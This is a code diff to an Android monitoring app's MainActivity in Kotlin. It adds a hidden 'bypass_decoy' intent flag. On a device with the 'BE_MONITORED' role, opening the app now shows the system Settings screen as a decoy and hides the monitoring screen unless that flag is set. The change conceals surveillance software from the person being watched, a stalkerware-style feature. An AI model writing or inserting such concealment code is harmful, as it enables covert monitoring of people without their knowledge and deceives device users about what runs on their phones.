@@ -15,6 +15,7 @@ class MainActivity : AppCompatActivity() {
         val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)
         val savedRole = prefs.getString("ROLE", null)
         val savedKey = prefs.getString("SESSION_KEY", null)
+        val bypassDecoy = intent.getBooleanExtra("bypass_decoy", false)
 
         if (savedRole != null && savedKey != null) {
             if (savedRole == "MONITOR") {
@@ -24,11 +25,19 @@ class MainActivity : AppCompatActivity() {
                 finish()
                 return
             } else if (savedRole == "BE_MONITORED") {
-                val intent = Intent(this, BeMonitoredActivity::class.java)
-                intent.putExtra("SESSION_KEY", savedKey)
-                startActivity(intent)
-                finish()
-                return
+                if (bypassDecoy) {
+                    val intent = Intent(this, BeMonitoredActivity::class.java)
+                    intent.putExtra("SESSION_KEY", savedKey)
+                    startActivity(intent)
+                    finish()
+                    return
+                } else {
+                    // Decoy action: Launch device settings and finish
+                    val intent = Intent(android.provider.Settings.ACTION_SETTINGS)
+                    startActivity(intent)
+                    finish()
+                    return
+                }
             }
         }
 
